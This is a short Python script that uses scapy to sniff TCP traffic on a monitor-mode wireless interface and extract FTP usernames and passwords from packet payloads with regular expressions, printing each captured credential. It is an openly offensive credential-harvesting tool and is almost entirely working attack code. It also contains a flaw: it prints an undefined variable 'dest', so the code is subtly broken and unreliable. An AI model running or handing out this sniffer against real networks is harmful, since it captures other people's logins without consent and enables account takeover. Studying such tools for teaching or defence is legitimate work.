#!/usr/bin/python3
from scapy.all import *
import re

def findFTP(pkt):
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)
    if user:
        print("[+] Detected FTP Login to:- {}".format(str(dest)))
        print("[+] User:- {}".format(str(user[0])))
    elif pswd:
        print("[+] Password:- {}".format(str(pswd[0])))

if __name__ == "__main__":
    conf.iface = "wlan1mon"
    sniff(filter="tcp",prn=findFTP,store=0)
                                                                            